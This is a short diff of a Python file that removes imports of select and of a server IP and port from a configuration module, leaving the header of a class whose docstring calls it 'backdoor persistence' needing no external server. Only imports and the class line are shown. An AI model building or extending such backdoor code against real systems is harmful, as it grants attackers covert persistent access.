@@ -1,7 +1,6 @@
 import socket
 import threading
 import time
-import select
 import random
 from datetime import datetime
 import subprocess
@@ -10,7 +9,6 @@ import subprocess
 import sys
 import os
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from configuration import SERVER_IP, SERVER_PORT
 
 class PersistentChannel:
     """Simple independent backdoor persistence - no external server needed"""
